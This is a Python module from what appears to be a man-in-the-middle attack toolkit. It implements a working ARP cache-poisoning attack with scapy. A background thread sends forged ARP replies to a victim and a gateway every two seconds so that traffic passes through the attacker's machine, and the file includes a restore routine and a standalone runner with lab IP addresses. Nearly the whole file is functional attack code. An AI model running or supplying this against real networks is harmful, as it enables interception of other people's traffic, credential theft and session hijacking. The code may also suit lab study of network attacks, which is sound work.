"""
src/attacks/arp_spoofing.py: Module for ARP spoofing attack.
"""

import time
import threading
from scapy.all import ARP, send

from src.core.network import get_mac_for_ip


class ARPSpoofer(threading.Thread):
    """
    Performs persistent ARP cache poisoning.
    Lies to the Victim and the Gateway so the Attacker becomes MITM.
    """

    def __init__(self, target_ip: str, gateway_ip: str, interface: str = "enp0s3"):
        super().__init__()
        self.daemon = True

        # Which NIC to use
        self.interface = interface or "enp0s3"
        print(f"[DEBUG] Using interface: {self.interface}")

        # Clean thread stop flag
        self._stop_event = threading.Event()

        # Store IPs
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip

        # Resolve MAC addresses
        self.target_mac = get_mac_for_ip(self.target_ip, self.interface)
        self.gateway_mac = get_mac_for_ip(self.gateway_ip, self.interface)

        if not self.target_mac or not self.gateway_mac:
            raise Exception("Failed to resolve necessary MAC addresses. Check network connectivity.")

        print(f"[INFO] Resolved Victim MAC: {self.target_mac}")
        print(f"[INFO] Resolved Gateway MAC: {self.gateway_mac}")

    def _create_spoof(self, pdst: str, hwdst: str, psrc: str) -> ARP:
        """Create ARP reply packet claiming psrc is at our MAC."""
        return ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)

    def run(self):
        """Main spoofing loop."""
        print("[INFO] ARP Spoofing thread started (poisoning started).")

        while not self._stop_event.is_set():
            try:
                # Lie to victim: gateway is at attacker MAC
                victim_spoof = self._create_spoof(
                    pdst=self.target_ip,
                    hwdst=self.target_mac,
                    psrc=self.gateway_ip
                )

                # Lie to gateway: victim is at attacker MAC
                gateway_spoof = self._create_spoof(
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=self.target_ip
                )

                send(victim_spoof, iface=self.interface, verbose=False)
                send(gateway_spoof, iface=self.interface, verbose=False)

            except Exception as e:
                print(f"[ERROR] ARP spoofing error: {e}")

            time.sleep(2)

        print("[INFO] ARP Spoofing thread finished.")

    def stop(self):
        """Stop the thread and restore original ARP tables."""
        print("[INFO] Stopping ARP Spoofer…")
        self._stop_event.set()
        self._restore()

    def _restore(self):
        """Restore true MAC mappings."""
        victim_restore = ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac
        )

        gateway_restore = ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac
        )

        print("[INFO] Restoring ARP tables…")
        for _ in range(5):
            send(victim_restore, iface=self.interface, verbose=False)
            send(gateway_restore, iface=self.interface, verbose=False)
            time.sleep(0.5)


def start_arp_spoof(target_ip: str, gateway_ip: str, interface: str = "enp0s3"):
    """
    Entry point used by the MITM pipeline.
    Always accepts an interface to avoid TypeError.
    """
    try:
        spoofer = ARPSpoofer(target_ip, gateway_ip, interface)
        spoofer.start()
        return spoofer
    except Exception as e:
        print(f"[CRITICAL ERROR] Failed to start ARPSpoofer: {e}")
        return None


# Allow running file directly
if __name__ == "__main__":
    TARGET_IP = "10.0.0.10"
    GATEWAY_IP = "10.0.0.1"
    INTERFACE = "enp0s3"

    spoofer = ARPSpoofer(TARGET_IP, GATEWAY_IP, INTERFACE)
    spoofer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        spoofer.stop()
        print("[INFO] Stopped ARP spoofing.")
